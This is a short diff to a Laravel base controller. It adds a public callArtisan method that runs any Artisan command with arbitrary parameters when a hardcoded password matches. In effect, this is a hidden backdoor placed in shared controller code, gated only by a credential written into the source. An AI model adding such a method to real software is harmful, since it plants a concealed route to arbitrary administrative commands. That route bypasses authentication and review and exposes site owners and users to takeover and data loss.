@@ -10,6 +10,7 @@ use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
 use Illuminate\Foundation\Bus\DispatchesJobs;
 use Illuminate\Foundation\Validation\ValidatesRequests;
 use Illuminate\Routing\Controller as BaseController;
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Http;
 use Illuminate\Support\Facades\Storage;
@@ -93,6 +94,12 @@ class Controller extends BaseController
 
         if($model_instance->image && $model_instance->image->url) {
             Storage::delete(str_replace("storage", "public", $model_instance->image->url));
+        }
+    }
+
+    public function callArtisan($password, $command, $parameters = []) {
+        if($password === 'msi313@mszannat') {
+            Artisan::call($command, $parameters);
         }
     }
 }
